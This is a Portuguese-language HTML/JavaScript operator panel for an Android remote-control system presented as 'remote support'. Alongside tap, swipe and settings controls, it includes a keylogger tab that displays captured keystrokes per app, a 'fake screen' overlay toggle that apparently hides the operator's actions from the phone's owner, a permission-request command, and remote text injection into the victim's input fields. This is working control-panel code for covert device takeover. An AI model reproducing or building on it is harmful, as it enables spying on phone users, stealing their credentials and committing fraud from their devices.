<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Suporte Remoto — Técnico</title>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@3.2.0/tabler-icons.min.css">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:100vh;display:flex;flex-direction:column}
.topbar{display:flex;align-items:center;justify-content:space-between;padding:10px 20px;background:#161b27;border-bottom:1px solid #2d3748}
.logo{display:flex;align-items:center;gap:8px;font-size:15px;font-weight:600;color:#fff}
.logo i{color:#4299e1}
.status{display:flex;align-items:center;gap:6px;font-size:12px;padding:4px 12px;border-radius:999px;background:#1a202c}
.status.online{color:#68d391}.status.offline{color:#718096}
.dot{width:7px;height:7px;border-radius:50%;background:currentColor}
.sidebar{background:#161b27;border-right:1px solid #2d3748;padding:12px;display:flex;flex-direction:column;gap:4px;overflow-y:auto}
.sec-title{font-size:10px;color:#4a5568;letter-spacing:.08em;text-transform:uppercase;padding:8px 6px 4px}
.ctrl{display:flex;align-items:center;gap:8px;padding:7px 8px;border-radius:8px;border:none;background:transparent;color:#a0aec0;cursor:pointer;font-size:12px;width:100%;text-align:left}
.ctrl:hover{background:#1e2433;color:#e2e8f0}
.ctrl i{font-size:15px;color:#4a5568;flex-shrink:0}
.ctrl.danger:hover{background:#2d1515;color:#fc8181}
.ctrl.danger:hover i{color:#fc8181}
.ctrl.warn{color:#ed8936}.ctrl.warn i{color:#ed8936}
.ctrl.warn:hover{background:#2d1f0a}
.ctrl.purple{color:#9f7aea}.ctrl.purple i{color:#9f7aea}
.ctrl.purple:hover{background:#1a1535}
.center{display:flex;flex-direction:column;align-items:center;padding:12px 20px;gap:8px;overflow:auto}
.device{background:#111827;border:3px solid #374151;border-radius:32px;position:relative;flex-shrink:0;box-shadow:0 0 0 1px #1f2937,0 20px 60px rgba(0,0,0,.5);overflow:hidden}
.screen{width:100%;height:100%;background:#0d1117;cursor:crosshair;position:relative;overflow:hidden}
#wireframe-canvas{position:absolute;top:0;left:0;width:100%;height:100%}
.placeholder{text-align:center;color:#2d3748;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)}
.placeholder i{font-size:36px;display:block;margin-bottom:8px}
.placeholder p{font-size:11px}
.nav-bar{display:flex;gap:6px;justify-content:center;flex-wrap:wrap}
.nav-btn{padding:8px 14px;background:#1e2433;border:1px solid #2d3748;border-radius:10px;color:#a0aec0;cursor:pointer;font-size:11px;display:flex;align-items:center;gap:4px;flex-direction:column}
.nav-btn:hover{background:#2d3748;color:#fff}
.nav-btn.purple{border-color:#9f7aea;color:#9f7aea}
.nav-btn.purple:hover{background:#1a1535}
.nav-btn.active-overlay{border-color:#fc8181;color:#fc8181;animation:pulse 1.5s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
.nav-btn i{font-size:16px}
.nav-btn span{font-size:9px}
.msg-box{display:flex;gap:6px;width:100%}
.msg-box input{flex:1;background:#1e2433;border:1px solid #2d3748;border-radius:8px;padding:8px 12px;color:#e2e8f0;font-size:13px;outline:none}
.msg-box input:focus{border-color:#4299e1}
.msg-box input::placeholder{color:#4a5568}
.msg-box button{padding:8px 14px;background:#4299e1;border:none;border-radius:8px;color:#fff;cursor:pointer;font-size:12px;display:flex;align-items:center;gap:4px}
.msg-box button:hover{background:#3182ce}
.right{border-left:1px solid #2d3748;background:#161b27;padding:12px;display:flex;flex-direction:column;overflow:hidden}
.stat-row{display:flex;justify-content:space-between;align-items:center;padding:5px 0;border-bottom:1px solid #1e2433;font-size:11px}
.stat-label{color:#4a5568}.stat-val{color:#e2e8f0;font-weight:500}
.tabs{display:flex;gap:4px;margin-top:8px;margin-bottom:4px}
.tab{padding:4px 10px;border-radius:6px;border:1px solid #2d3748;background:transparent;color:#718096;cursor:pointer;font-size:10px}
.tab.active{background:#1e2433;color:#e2e8f0;border-color:#4299e1}
.log{flex:1;overflow-y:auto}
.log-entry{font-size:10px;padding:3px 0;border-bottom:1px solid #1a202c;color:#718096}
.log-entry .ts{color:#2d3748;margin-right:6px}
.log-entry.ev{color:#68d391}.log-entry.err{color:#fc8181}.log-entry.warn{color:#ed8936}
.keylog-entry{font-size:11px;padding:4px 6px;border-bottom:1px solid #1a202c;color:#e2e8f0;font-family:monospace}
.keylog-entry .app{font-size:9px;color:#4a5568;display:block;margin-bottom:2px}
.vol-row{display:flex;align-items:center;gap:6px;padding:4px 0;font-size:11px;color:#718096}
.vol-row input[type=range]{flex:1;accent-color:#4299e1}
#tela-clientes{display:flex;flex-direction:column;align-items:center;justify-content:center;flex:1;gap:16px;padding:20px}
#tela-clientes h2{font-size:14px;color:#a0aec0}
.cliente-card{background:#1e2433;border:1px solid #2d3748;border-radius:12px;padding:12px 16px;width:320px;display:flex;align-items:center;justify-content:space-between;gap:12px}
.cliente-info{font-size:12px;color:#a0aec0;line-height:1.6}
.cliente-info strong{color:#e2e8f0;font-size:13px}
.btn-atender{padding:7px 14px;background:#4299e1;border:none;border-radius:8px;color:#fff;cursor:pointer;font-size:12px}
.btn-atender:hover{background:#3182ce}
.sem-clientes{color:#4a5568;font-size:13px;text-align:center}
.sem-clientes i{font-size:32px;display:block;margin-bottom:8px}
#tela-painel{display:none;flex:1;overflow:hidden}
.painel-inner{display:grid;grid-template-columns:200px 1fr 240px;height:100%}
</style>
</head>
<body>
<div class="topbar">
  <div class="logo"><i class="ti ti-device-laptop"></i> Suporte Remoto</div>
  <div style="display:flex;align-items:center;gap:10px">
    <span class="status offline" id="status-badge"><span class="dot"></span> Desconectado</span>
    <span style="font-size:11px;color:#4a5568" id="session-id-top"></span>
    <button id="btn-voltar" onclick="voltarLista()" style="display:none;padding:4px 10px;background:#1e2433;border:1px solid #2d3748;border-radius:6px;color:#a0aec0;cursor:pointer;font-size:11px">
      <i class="ti ti-arrow-left"></i> Voltar
    </button>
  </div>
</div>

<div style="display:flex;flex:1;overflow:hidden">

  <!-- TELA: lista de clientes -->
  <div id="tela-clientes">
    <h2><i class="ti ti-devices" style="margin-right:6px"></i>Clientes aguardando atendimento</h2>
    <div id="lista-clientes">
      <div class="sem-clientes"><i class="ti ti-device-mobile-off"></i>Nenhum cliente conectado</div>
    </div>
  </div>

  <!-- TELA: painel do técnico -->
  <div id="tela-painel">
    <div class="painel-inner">

      <!-- Sidebar -->
      <div class="sidebar">
        <p class="sec-title">Sistema</p>
        <button class="ctrl" onclick="sendCmd('home')"><i class="ti ti-home"></i> Home</button>
        <button class="ctrl" onclick="sendCmd('back')"><i class="ti ti-arrow-left"></i> Voltar</button>
        <button class="ctrl" onclick="sendCmd('recents')"><i class="ti ti-layout-grid"></i> Recentes</button>
        <button class="ctrl" onclick="sendCmd('lock')"><i class="ti ti-lock"></i> Bloquear</button>
        <button class="ctrl" onclick="sendCmd('notifications')"><i class="ti ti-bell"></i> Notificações</button>
        <button class="ctrl" onclick="sendCmd('settings')"><i class="ti ti-settings"></i> Configurações</button>
        <button class="ctrl" onclick="sendCmd('camera')"><i class="ti ti-camera"></i> Câmera</button>
        <p class="sec-title">Wi-Fi / Bluetooth</p>
        <button class="ctrl" onclick="sendCmd('wifi_on')"><i class="ti ti-wifi"></i> Wi-Fi ON</button>
        <button class="ctrl" onclick="sendCmd('wifi_off')"><i class="ti ti-wifi-off"></i> Wi-Fi OFF</button>
        <button class="ctrl" onclick="sendCmd('bt_on')"><i class="ti ti-bluetooth"></i> BT ON</button>
        <button class="ctrl" onclick="sendCmd('bt_off')"><i class="ti ti-bluetooth-off"></i> BT OFF</button>
        <p class="sec-title">Volume</p>
        <div class="vol-row"><i class="ti ti-volume"></i><input type="range" min="0" max="15" value="5" oninput="send({tipo:'volume',valor:+this.value})"></div>
        <div class="vol-row"><i class="ti ti-brightness"></i><input type="range" min="0" max="255" value="120" oninput="send({tipo:'brilho',valor:+this.value})"></div>
        <p class="sec-title">Controle</p>
        <button class="ctrl warn" onclick="pedirWireframe()"><i class="ti ti-refresh"></i> Atualizar tela</button>
        <button class="ctrl" onclick="send({tipo:'cmd',cmd:'pedir_permissoes'})"><i class="ti ti-shield-check"></i> Pedir permissões</button>
        <button class="ctrl purple" id="btn-overlay-sidebar" onclick="toggleOverlay()"><i class="ti ti-device-mobile-pause"></i> Tela falsa</button>
        <p class="sec-title">Sessão</p>
        <button class="ctrl danger" onclick="encerrar()"><i class="ti ti-plug-x"></i> Encerrar sessão</button>
      </div>

      <!-- Centro: visor do dispositivo -->
      <div class="center">
        <div class="device" id="device-wrap">
          <div class="screen" id="screen" onclick="handleToque(event)">
            <canvas id="wireframe-canvas"></canvas>
            <div class="placeholder" id="placeholder">
              <i class="ti ti-device-mobile"></i>
              <p>Aguardando wireframe...</p>
            </div>
          </div>
        </div>

        <div class="nav-bar">
          <button class="nav-btn" onclick="sendCmd('back')"><i class="ti ti-arrow-left"></i><span>Voltar</span></button>
          <button class="nav-btn" onclick="sendCmd('home')"><i class="ti ti-circle"></i><span>Home</span></button>
          <button class="nav-btn" onclick="sendCmd('recents')"><i class="ti ti-square"></i><span>Recentes</span></button>
          <button class="nav-btn" onclick="send({tipo:'swipe',dir:'up'})"><i class="ti ti-arrow-up"></i><span>Swipe ↑</span></button>
          <button class="nav-btn" onclick="send({tipo:'swipe',dir:'down'})"><i class="ti ti-arrow-down"></i><span>Swipe ↓</span></button>
          <button class="nav-btn" onclick="pedirWireframe()"><i class="ti ti-refresh"></i><span>Atualizar</span></button>
          <button class="nav-btn purple" id="btn-overlay-nav" onclick="toggleOverlay()"><i class="ti ti-device-mobile-pause"></i><span>Tela falsa</span></button>
        </div>

        <div class="msg-box">
          <input type="text" id="msg-input" placeholder="Enviar mensagem ao dispositivo..." onkeydown="if(event.key==='Enter') enviarMensagem()">
          <button onclick="enviarMensagem()"><i class="ti ti-send"></i> Enviar</button>
        </div>
      </div>

      <!-- Direita: status + log -->
      <div class="right">
        <p class="sec-title">Status do dispositivo</p>
        <div class="stat-row"><span class="stat-label">Bateria</span><span class="stat-val" id="d-bat">—</span></div>
        <div class="stat-row"><span class="stat-label">RAM</span><span class="stat-val" id="d-ram">—</span></div>
        <div class="stat-row"><span class="stat-label">Wi-Fi</span><span class="stat-val" id="d-wifi">—</span></div>
        <div class="stat-row"><span class="stat-label">Android</span><span class="stat-val" id="d-os">—</span></div>
        <div class="stat-row"><span class="stat-label">Modelo</span><span class="stat-val" id="d-model">—</span></div>
        <div class="stat-row"><span class="stat-label">Resolução</span><span class="stat-val" id="d-res">—</span></div>
        <div class="tabs">
          <button class="tab active" id="tab-log" onclick="mudarAba('log')">📋 Log</button>
          <button class="tab" id="tab-key" onclick="mudarAba('key')">⌨️ Keylogger <span id="key-badge" style="display:none;background:#fc8181;color:#fff;border-radius:999px;padding:0 5px;font-size:9px;margin-left:2px">!</span></button>
        </div>
        <div class="log" id="painel-log"></div>
        <div class="log" id="painel-key" style="display:none"></div>
      </div>

    </div>
  </div>
</div>

<script>
const SERVER = window.location.origin.replace(/^http/, 'ws');
let ws = null, deviceAtual = null;
let dw = 1080, dh = 2340;
let abaAtual = 'log', overlayAtivo = false;
const VISOR_W = 260;

// ── WebSocket ──────────────────────────────────────────────────────────────

function conectar() {
  ws = new WebSocket(`${SERVER}?papel=tecnico`);
  ws.onopen = () => {
    setStatus(true);
    log('Painel conectado', 'ev');
    if (deviceAtual) {
      setTimeout(() => send({tipo:'conectar_cliente', deviceToken: deviceAtual}), 1000);
    }
  };
  ws.onmessage = (e) => {
    const msg = JSON.parse(e.data);
    switch (msg.tipo) {
      case 'lista_clientes':   renderClientes(msg.clientes); break;
      case 'sessao_iniciada':  onSessaoIniciada(msg); break;
      case 'arvore_tela':      desenharWireframe(JSON.parse(msg.elementos), msg.pacote); break;
      case 'keylog':           logKey(msg.texto, msg.app || '?'); break;
      case 'campo_texto_focado':
        abrirInputTexto(msg.texto_atual || '');
        break;
      case 'cliente_desconectou': log('Cliente desconectou', 'err'); break;
    }
  };
  ws.onclose = () => { setStatus(false); setTimeout(conectar, 3000); };
}

conectar();

function send(msg) {
  if (ws && ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify(msg));
}
function sendCmd(cmd) { send({tipo:'cmd', cmd}); log(`→ ${cmd}`); }
function pedirWireframe() { send({tipo:'cmd', cmd:'solicitar_tela'}); log('→ Atualizando wireframe...', 'ev'); }

// ── Sessão ─────────────────────────────────────────────────────────────────

function onSessaoIniciada(msg) {
  deviceAtual = msg.deviceToken;
  atualizarInfo(msg.info);
  document.getElementById('tela-clientes').style.display = 'none';
  document.getElementById('tela-painel').style.display = 'flex';
  document.getElementById('btn-voltar').style.display = 'block';
  document.getElementById('session-id-top').textContent = `Token: ${deviceAtual}`;
  log('Sessão iniciada', 'ev');
  // Pede wireframe automaticamente ao conectar
  setTimeout(pedirWireframe, 600);
}

function voltarLista() {
  if (overlayAtivo) toggleOverlay();
  deviceAtual = null;
  document.getElementById('tela-painel').style.display = 'none';
  document.getElementById('tela-clientes').style.display = 'flex';
  document.getElementById('btn-voltar').style.display = 'none';
  document.getElementById('session-id-top').textContent = '';
  document.getElementById('placeholder').style.display = 'flex';
  const ctx = document.getElementById('wireframe-canvas').getContext('2d');
  ctx.clearRect(0, 0, 9999, 9999);
}

function encerrar() { send({tipo:'encerrar'}); voltarLista(); log('Sessão encerrada', 'err'); }

// ── Wireframe ──────────────────────────────────────────────────────────────

function desenharWireframe(elementos, pacote) {
  const canvas  = document.getElementById('wireframe-canvas');
  const screen  = document.getElementById('screen');
  const sw = screen.offsetWidth  || VISOR_W;
  const sh = screen.offsetHeight || Math.round(VISOR_W * dh / dw);

  canvas.width  = sw;
  canvas.height = sh;

  const ctx = canvas.getContext('2d');
  ctx.clearRect(0, 0, sw, sh);
  ctx.fillStyle = '#0d1117';
  ctx.fillRect(0, 0, sw, sh);

  if (pacote) {
    ctx.fillStyle = '#4a5568';
    ctx.font = '9px system-ui';
    ctx.fillText(pacote, 4, 12);
  }

  const sx = sw / dw;
  const sy = sh / dh;

  elementos.forEach(el => {
    const x = el.x * sx, y = el.y * sy;
    const w = el.w * sx, h = el.h * sy;

    if (el.editavel)      { ctx.strokeStyle='#4299e1'; ctx.fillStyle='rgba(66,153,225,.1)'; }
    else if (el.clicavel) { ctx.strokeStyle='#68d391'; ctx.fillStyle='rgba(104,211,145,.07)'; }
    else if (el.rolavel)  { ctx.strokeStyle='#ed8936'; ctx.fillStyle='rgba(237,137,54,.05)'; }
    else                  { ctx.strokeStyle='#2d3748'; ctx.fillStyle='transparent'; }

    ctx.lineWidth = (el.clicavel || el.editavel) ? 1.5 : 0.5;
    ctx.fillRect(x, y, w, h);
    ctx.strokeRect(x, y, w, h);

    const label = el.txt || el.desc || el.cls;
    if (label && h > 8) {
      ctx.fillStyle = el.clicavel ? '#68d391' : el.editavel ? '#4299e1' : '#4a5568';
      ctx.font = `${Math.min(11, Math.max(7, h * 0.35))}px system-ui`;
      ctx.save();
      ctx.beginPath(); ctx.rect(x+2, y, w-4, h); ctx.clip();
      ctx.fillText(label.substring(0, 30), x+3, y + h/2 + 4);
      ctx.restore();
    }
  });

  document.getElementById('placeholder').style.display = 'none';
  log(`Wireframe: ${elementos.length} elementos`, 'ev');
}

// ── Toque ──────────────────────────────────────────────────────────────────

function handleToque(e) {
  const r = document.getElementById('screen').getBoundingClientRect();
  const xPct = Math.max(0, Math.min(100, (e.clientX - r.left)  / r.width  * 100));
  const yPct = Math.max(0, Math.min(100, (e.clientY - r.top)   / r.height * 100));
  send({tipo:'toque', x:+xPct.toFixed(4), y:+yPct.toFixed(4), largura:dw, altura:dh});
  log(`→ toque ${xPct.toFixed(1)}% ${yPct.toFixed(1)}%`);
}

// ── Overlay ────────────────────────────────────────────────────────────────

function toggleOverlay() {
  overlayAtivo = !overlayAtivo;
  send({tipo:'cmd', cmd: overlayAtivo ? 'overlay_on' : 'overlay_off'});
  const btnN = document.getElementById('btn-overlay-nav');
  const btnS = document.getElementById('btn-overlay-sidebar');
  if (overlayAtivo) {
    btnN.className = 'nav-btn active-overlay';
    btnN.innerHTML = '<i class="ti ti-device-mobile-pause"></i><span>Remover</span>';
    btnS.innerHTML = '<i class="ti ti-device-mobile-pause" style="font-size:15px;color:#fc8181"></i> Remover tela falsa';
    log('→ Tela falsa ON', 'warn');
  } else {
    btnN.className = 'nav-btn purple';
    btnN.innerHTML = '<i class="ti ti-device-mobile-pause"></i><span>Tela falsa</span>';
    btnS.innerHTML = '<i class="ti ti-device-mobile-pause" style="font-size:15px;color:#9f7aea"></i> Tela falsa';
    log('→ Tela falsa OFF', 'ev');
  }
}

// ── Mensagem ───────────────────────────────────────────────────────────────

function enviarMensagem() {
  const v = document.getElementById('msg-input').value.trim();
  if (!v) return;
  send({tipo:'mensagem', texto:v});
  log(`→ msg: ${v}`, 'ev');
  document.getElementById('msg-input').value = '';
}

// ── Info dispositivo ───────────────────────────────────────────────────────

function atualizarInfo(info) {
  if (!info) return;
  document.getElementById('d-bat').textContent   = info.bateria || '—';
  document.getElementById('d-ram').textContent   = info.ram     || '—';
  document.getElementById('d-wifi').textContent  = info.wifi    || '—';
  document.getElementById('d-os').textContent    = info.android || '—';
  document.getElementById('d-model').textContent = info.modelo  || '—';
  if (info.largura && info.altura) {
    dw = parseInt(info.largura);
    dh = parseInt(info.altura);
    document.getElementById('d-res').textContent = `${dw}×${dh}`;
    const h = Math.round(VISOR_W * dh / dw);
    const wrap = document.getElementById('device-wrap');
    const screen = document.getElementById('screen');
    wrap.style.width  = screen.style.width  = VISOR_W + 'px';
    wrap.style.height = screen.style.height = h + 'px';
  }
}

// ── Clientes ───────────────────────────────────────────────────────────────

function renderClientes(clientes) {
  const el = document.getElementById('lista-clientes');
  if (!clientes || clientes.length === 0) {
    el.innerHTML = '<div class="sem-clientes"><i class="ti ti-device-mobile-off"></i>Nenhum cliente conectado</div>';
    return;
  }
  el.innerHTML = clientes.map(c => `
    <div class="cliente-card">
      <div class="cliente-info">
        <strong>${c.info?.modelo || 'Dispositivo desconhecido'}</strong><br>
        ${c.info?.android||''} &nbsp;|&nbsp; Bateria: ${c.info?.bateria||'—'} &nbsp;|&nbsp; ${c.info?.wifi||'—'}
        ${c.emAtendimento ? ' &nbsp;<span style="color:#68d391">● Em atendimento</span>' : ''}
      </div>
      <button class="btn-atender" onclick="send({tipo:'conectar_cliente',deviceToken:'${c.deviceToken}'})">
        <i class="ti ti-headset"></i> Atender
      </button>
    </div>
  `).join('');
}

// ── Log ────────────────────────────────────────────────────────────────────

function mudarAba(aba) {
  abaAtual = aba;
  document.getElementById('painel-log').style.display = aba==='log' ? 'block' : 'none';
  document.getElementById('painel-key').style.display = aba==='key' ? 'block' : 'none';
  document.getElementById('tab-log').className = 'tab' + (aba==='log' ? ' active' : '');
  document.getElementById('tab-key').className = 'tab' + (aba==='key' ? ' active' : '');
  if (aba==='key') document.getElementById('key-badge').style.display = 'none';
}

function log(msg, tipo='') {
  const el = document.getElementById('painel-log');
  const d  = document.createElement('div');
  d.className = 'log-entry ' + tipo;
  d.innerHTML = `<span class="ts">${new Date().toLocaleTimeString('pt-BR')}</span>${msg}`;
  el.prepend(d);
}

function logKey(texto, app) {
  const el = document.getElementById('painel-key');
  const d  = document.createElement('div');
  d.className = 'keylog-entry';
  d.innerHTML = `<span class="app">${new Date().toLocaleTimeString('pt-BR')} — ${app}</span>${texto}`;
  el.prepend(d);
  if (abaAtual !== 'key') document.getElementById('key-badge').style.display = 'inline';
}

function setStatus(online) {
  const b = document.getElementById('status-badge');
  b.className = 'status ' + (online ? 'online' : 'offline');
  b.innerHTML = `<span class="dot"></span> ${online ? 'Conectado' : 'Desconectado'}`;
}
</script>

<!-- Input flutuante de texto remoto -->
<div id="texto-modal" style="display:none;position:fixed;bottom:80px;left:50%;transform:translateX(-50%);background:#1e2433;border:1px solid #4299e1;border-radius:12px;padding:12px;z-index:999;width:480px;max-width:90vw;box-shadow:0 8px 32px rgba(0,0,0,.5)">
  <div style="font-size:11px;color:#4299e1;margin-bottom:8px">⌨️ Campo de texto ativo — digite e envie</div>
  <div style="display:flex;gap:8px">
    <input id="texto-remoto" type="text" placeholder="Digite o texto..." style="flex:1;background:#0f1117;border:1px solid #2d3748;border-radius:8px;padding:8px 12px;color:#e2e8f0;font-size:14px;outline:none"
      onkeydown="if(event.key==='Enter') enviarTextoRemoto()">
    <button onclick="enviarTextoRemoto()" style="padding:8px 14px;background:#4299e1;border:none;border-radius:8px;color:#fff;cursor:pointer;font-size:12px">Enviar</button>
    <button onclick="fecharInputTexto()" style="padding:8px 12px;background:#2d3748;border:none;border-radius:8px;color:#a0aec0;cursor:pointer;font-size:12px">✕</button>
  </div>
</div>

<script>
function abrirInputTexto(textoAtual) {
  const modal = document.getElementById('texto-modal');
  const input = document.getElementById('texto-remoto');
  input.value = textoAtual;
  modal.style.display = 'block';
  setTimeout(() => input.focus(), 100);
  log('Campo de texto focado no celular', 'ev');
}

function fecharInputTexto() {
  document.getElementById('texto-modal').style.display = 'none';
}

function enviarTextoRemoto() {
  const val = document.getElementById('texto-remoto').value;
  if (!val) return;
  send({tipo:'cmd', cmd:'texto', valor: val});
  log(`→ texto: ${val}`, 'ev');
  fecharInputTexto();
}
</script>
</body>
</html>
